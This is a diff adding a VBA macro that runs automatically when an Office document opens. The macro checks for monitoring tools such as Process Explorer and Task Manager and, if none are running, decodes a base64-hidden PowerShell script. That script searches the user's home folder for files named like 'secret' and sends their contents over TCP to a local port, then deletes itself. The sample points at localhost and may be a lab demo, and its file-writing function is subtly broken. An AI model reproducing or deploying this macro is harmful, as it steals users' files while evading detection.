@@ -1,0 +1,98 @@
+Public desktop As String
+
+Sub Main()
+  Dim res As String, flag As Boolean
+  
+  ' Gets path of current user's desktop
+  desktop = "C:" & Environ("HOMEPATH") & "\Desktop\"
+  res = runHiddenCmd("ping 192.168.39.25")
+  
+  ' Checks if the current enpoint is connected to the internet
+  If Instr(res, "Approximate round") > 0 And canIRun() Then
+    Dim randomData As String, decryptedMsg As String, filePath As String
+    Dim WsShell As Object, command As String
+    randomData = "RnVuY3Rpb24gU2VuZC1UQ1BNZXNzYWdlIHsgCiAgICBQYXJhbSAoIAogICAgICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249MCld" & "CiAgICAgICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldIAogICAgICAgICAgICBbc3RyaW5nXSAKICAgICAgICAgICAgJEVuZFBvaW50CiAgICAgICAgLCAKICAgICAgICAg" & "ICAgW1BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTEpXQogICAgICAgICAgICBbaW50XQogICAgICAgICAgICAkUG9ydAogICAgICAgICwgCiAgICAgICAgICAgIFtQYX" & "JhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0yKV0KICAgICAgICAgICAgW3N0cmluZ10KICAgICAgICAgICAgJE1lc3NhZ2UKICAgICkgCiAgICBQcm9jZXNzIHsKICAgICAgI" & "CAjIFNldHVwIGNvbm5lY3Rpb24gCiAgICAgICAgJElQID0gW1N5c3RlbS5OZXQuRG5zXTo6R2V0SG9zdEFkZHJlc3NlcygkRW5kUG9pbnQpIAogICAgICAgICRBZGRyZXNzID0gW1N5c3RlbS" & "5OZXQuSVBBZGRyZXNzXTo6UGFyc2UoJElQKSAKICAgICAgICAkU29ja2V0ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCRBZGRyZXNzLCRQb3J0KSAKICAgIAog" & "ICAgICAgICMgU2V0dXAgc3RyZWFtIHdydGllciAKICAgICAgICAkU3RyZWFtID0gJFNvY2tldC5HZXRTdHJlYW0oKSAKICAgICAgICAkV3JpdGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uU3R" & "yZWFtV3JpdGVyKCRTdHJlYW0pCgogICAgICAgICMgV3JpdGUgbWVzc2FnZSB0byBzdHJlYW0KICAgICAgICAkTWVzc2FnZSB8ICUgewogICAgICAgICAgICAkV3JpdGVyLldyaXRlTGluZSgkXykK" & "ICAgICAgICAgICAgJFdyaXRlci5GbHVzaCgpCiAgICAgICAgfQogICAgCiAgICAgICAgIyBDbG9zZSBjb25uZWN0aW9uIGFuZCBzdHJlYW0KICAgICAgICAkU3RyZWFtLkNsb3NlKCkKICAgICAgIC" & "AkU29ja2V0LkNsb3NlKCkKICAgIH0KfQoKJGZpbGVzID0gR2V0LUNoaWxkSXRlbSAkSE9NRSAtUmVjdXJzZSAtRmlsZQoKZm9yZWFjaCAoJGZpbGUgaW4gJGZpbGVzKXsKICAgICRmaWxlTmFtZSA9I" & "CRmaWxlLk5hbWUKICAgIGlmICgkZmlsZU5hbWUgLWxpa2UgJypzZWNyZXQqJyl7CiAgICAgICAgd3JpdGUtaG9zdCAkZmlsZW5hbWUKICAgICAgICAkZGF0YSA9ICQoR2V0LUNvbnRlbnQgLVBhdGggJ" & "GZpbGUuRnVsbE5hbWUpCiAgICAgICAgJG1zZyA9ICJGaWxlIG5hbWU6ICQoJGZpbGVOYW1lKWBuRGF0YTogJCgkZGF0YSkiCiAgICAgICAgU2VuZC1UQ1BNZXNzYWdlIC1Qb3J0IDIwMjAgLUVuZHBvaW" & "50IDEyNy4wLjAuMSAtbWVzc2FnZSAkbXNnCiAgICB9Cgp9CgpSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggIiQoJFBTU2NyaXB0Um9vdClcbm90TWFsLnBzMSIgLUZvcmNlCg=="
+    
+    ' Saves decrypted data to powershell file
+    decryptedMsg = DecodeBase64(randomData)
+    filePath = desktop & "notMal.ps1"
+    createFile decryptedMsg, filePath
+    
+    ' Executes ps file (file deletes itself automatically) :)
+    command = "Powershell.exe -ExecutionPolicy ByPass -File " & filePath
+    Set WsShell = CreateObject("WScript.Shell")
+    WsShell.Run command, 0
+    
+    
+  End If
+ End Sub
+
+ Function runHiddenCmd(command As String)
+  Dim filePath As String, strOutput
+  Dim fso As Object, WshShell As Object
+  
+  filePath = desktop & "out.txt"
+  Set WshShell = CreateObject("WScript.Shell")
+  
+  ' This part saves command's output to a temporary file
+  WshShell.Run "cmd /c " & command & " > " & filePath, 0, True
+  With CreateObject("Scripting.FileSystemObject")
+    
+    strOutput = .OpenTextFile(filePath).ReadAll()
+    
+  End With
+  
+  ' Returns cmd output
+  runHiddenCmd = strOutput
+End Function
+
+Function DecodeBase64(b64)
+  
+  ' Function decodes b64 variable
+  Dim B
+  
+  With CreateObject("Microsoft.XMLDOM").createElement("b64")
+    .DataType = "bin.base64": .Text = b64
+    B = .nodeTypedValue
+    With CreateObject("ADODB.Stream")
+      .Open: .Type = 1: .Write B: .Position = 0: .Type = 2: .Charset = "utf-8"
+      DecodeBase64 = .ReadText
+      .Close
+    End With
+  End With
+End Function
+
+Function createFile(data As String)
+  Dim fso, fileStream
+  
+  Set fso = New FileSystemObject
+  
+  ' Here the actual file is created and opened for write access
+  Set fileStream = fso.CreateTextFile(filePath)
+  fileStream.WriteLine data
+  
+  ' Close it, so it is not locked anymore
+  fileStream.Close
+End Function
+
+Function canIRun()
+  ' Function checks is process' are currently running
+  Dim res As String, diskSpace As String, Itm As Variant
+  Dim badProc As Variant
+  
+  ' tools list
+  badProc = Array("procexp.exe", "procexp64.exe", "Taskmgr.exe", "Procmon.exe", "Procmon64.exe")
+  res = runHiddenCmd("tasklist")
+  
+  ' check if one of them appears in tasklist output - which means it's running
+  For Each Itm In badProc
+    If (Instr(res, Itm) > 0) Then
+      canIRun = False
+      Exit Function
+    End If
+  Next Itm
+  canIRun = True
+End Function
+Sub Document_Open()
+  Main
+End Sub
